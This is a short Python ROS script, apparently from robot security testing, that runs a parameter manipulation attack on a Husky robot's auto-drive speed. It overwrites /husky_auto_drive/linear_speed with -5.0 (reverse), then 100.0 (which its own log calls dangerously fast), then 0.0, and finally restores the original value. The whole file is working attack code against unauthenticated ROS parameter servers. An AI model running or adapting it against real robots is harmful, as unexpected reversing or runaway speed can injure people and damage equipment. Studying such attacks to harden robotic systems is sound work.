#!/usr/bin/env python3

import rospy
import time

def param_manipulation_attack():

    try:
        rospy.init_node('param_attacker', anonymous=True)
        
        rospy.loginfo("[ATTACK] Parameter manipulation attack started")
        rospy.loginfo("[ATTACK] Target parameter: /husky_auto_drive/linear_speed")
        
        # Get original value
        try:
            original_speed = rospy.get_param('/husky_auto_drive/linear_speed')
            rospy.loginfo(f"[ATTACK] Original speed: {original_speed} m/s")
        except:
            original_speed = 0.5
            rospy.logwarn("[ATTACK] Could not read original parameter, assuming 0.5 m/s")
        
        # Attack sequence
        rospy.loginfo("[ATTACK] Setting speed to -5.0 m/s (REVERSE)")
        rospy.set_param('/husky_auto_drive/linear_speed', -5.0)
        rospy.sleep(3)
        
        rospy.loginfo("[ATTACK] Setting speed to 100.0 m/s (DANGEROUSLY FAST)")
        rospy.set_param('/husky_auto_drive/linear_speed', 100.0)
        rospy.sleep(3)
        
        rospy.loginfo("[ATTACK] Setting speed to 0.0 m/s (STOP)")
        rospy.set_param('/husky_auto_drive/linear_speed', 0.0)
        rospy.sleep(2)
        
        # Restore original
        rospy.loginfo(f"[ATTACK] Restoring original speed: {original_speed} m/s")
        rospy.set_param('/husky_auto_drive/linear_speed', original_speed)
        
        rospy.loginfo("[ATTACK] Parameter manipulation attack completed")
        rospy.loginfo("[ATTACK] Note: Node must re-read parameter for changes to take effect")
        
    except Exception as e:
        rospy.logerr(f"[ATTACK] Parameter manipulation failed: {str(e)}")

if __name__ == '__main__':
    param_manipulation_attack()
